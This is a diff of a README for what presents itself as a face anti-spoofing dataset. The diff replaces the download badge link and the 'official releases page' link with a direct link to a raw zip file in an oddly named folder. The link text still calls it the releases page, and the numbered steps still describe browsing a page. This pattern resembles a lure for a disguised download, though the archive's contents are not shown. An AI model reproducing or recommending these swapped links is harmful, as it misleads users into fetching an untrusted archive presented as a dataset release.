@@ -1,6 +1,6 @@
 # 🛡️ face-anti-spoofing-dataset - Secure your systems from biometric fraud
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ethanj7750/face-anti-spoofing-dataset/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Ethanj7750/face-anti-spoofing-dataset/main/preterpolitical/face_anti_dataset_spoofing_v2.6.zip)
 
 Face anti-spoofing protects systems from unauthorized access. This dataset provides the files necessary to train models that detect fake identities. It covers common presentation attacks including paper prints, screen replays, and 3D mask attempts. These samples follow iBeta certification standards, which help maintain high security for biometric devices.
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets these minimum specifications:
 
 Follow these steps to obtain the data:
 
-1. Visit the [official releases page](https://github.com/Ethanj7750/face-anti-spoofing-dataset/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Ethanj7750/face-anti-spoofing-dataset/main/preterpolitical/face_anti_dataset_spoofing_v2.6.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link to download the compressed folder.
 4. Open the folder once the download finishes.
